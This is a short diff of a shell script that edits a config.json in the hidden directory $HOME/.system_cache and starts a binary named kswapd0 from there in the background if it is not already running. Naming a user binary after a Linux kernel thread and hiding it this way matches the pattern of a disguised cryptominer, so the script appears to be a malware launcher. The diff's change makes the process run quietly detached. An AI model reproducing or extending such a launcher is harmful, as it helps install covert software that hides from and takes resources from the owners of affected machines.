@@ -64,7 +64,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config
 # Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
-    "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
+    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config.json" &
 else
     echo "kswapd0 is already running."
 fi
